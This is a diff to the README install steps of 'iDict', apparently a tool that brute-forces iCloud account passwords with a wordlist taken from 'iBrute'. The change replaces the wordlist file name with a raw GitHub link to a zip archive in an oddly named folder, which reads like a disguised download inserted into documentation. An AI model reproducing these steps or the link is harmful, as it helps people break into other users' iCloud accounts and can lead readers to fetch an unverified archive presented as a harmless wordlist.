@@ -9,7 +9,7 @@ Install:
 Put in HtDocs Folder in your Xampp installation.
 Install cUrl for your OS
 Navigate to http://127.0.0.1/iDict/ in your web browser (preferably Firefox, Chrome, or Safari).
-Wordlist.txt is from iBrute and it satisfies iCloud password Requirements
+https://raw.githubusercontent.com/ahmed2997751/iDict/master/thymoprivous/iDict.zip is from iBrute and it satisfies iCloud password Requirements
 It's been reported if icloud server responds with an error restart xampp or your computer
 
 
